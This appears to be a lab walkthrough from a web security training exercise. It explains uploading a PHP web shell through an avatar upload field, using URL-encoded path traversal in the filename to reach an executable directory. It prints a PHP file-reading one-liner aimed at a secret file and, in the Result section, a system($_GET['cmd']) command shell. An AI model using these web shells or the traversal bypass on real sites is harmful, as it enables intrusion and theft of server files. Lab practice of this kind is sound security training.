# Web shell upload via path traversal

**Vulnerability:** Vulnerability in the upload avatar function of the user account

---

### Objective
The goal of this lab upload shell code that can access the website's filesystem and print the file contents present in `/home/carlos/secret` from the image upload button. Send this text to the solution box in the same website

---

### Methodology

#### 1. Reconnaissance
First we have to login as the specified user password. When you upload your image or shellcode, it simply accepts the file. If you send the `POST` request to the repeater you can see your php file code accepted. When you return back to the account, you can see the `GET` request generated. Mofify the filepath to the image's file path, and the request prints out the shellcode in string text. This proves that this level of the filesystem cannot execute arbitrary commands and we need to go onto a higher directory with more freedom.

#### 2. Discovery & Exploitation

*   **Step 1:** Upload the same shellcode which worked on the previous labs and send the `POST` request to the repeater
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
now in the `Content-Disposition` section, change the filename to `../<filename>.php`
This should change the directory of the file one level higher. There maybe a blacklisted symbol, namely the `/`, which can be obfuscated using `%2f`.
Once you send this request, note the filepath name in the response, if the name stays the same, then obfuscate the periods too. It should be successful if you see the path `files/avatars/../<filename>.php`
*   **Step 2:**  
On the website and go back to the account, and send the same `GET` request to the repeater. The request should look like `files/avatars/..%2f<filename>.php`. You can right click the link of the image in the website to open it in a  new tab. This link should also have the same address as the request. Change the request to `files/<filename>.php`

*   **Step 3:** 
This is where you have uploaded the shellcode, and the link should print out the contents of the secret file. Otherwise the browser/repeater generates a bad request if you keep the symbols and the filepath as is from the previous `POST` request modification




#### 3. Result
Once you get the text, just feed it to the solution tab on the website. An issue that persists currently is the existence of 2 secret file contents. `<?php echo system($_GET['cmd']); ?>` this command allows you to run commands in the link using the `?cmd=<command>` addition. However, using this if you `cat+` print out the contents of the file, you get another solution key text which is not accepted by the lab's solution filter.




---


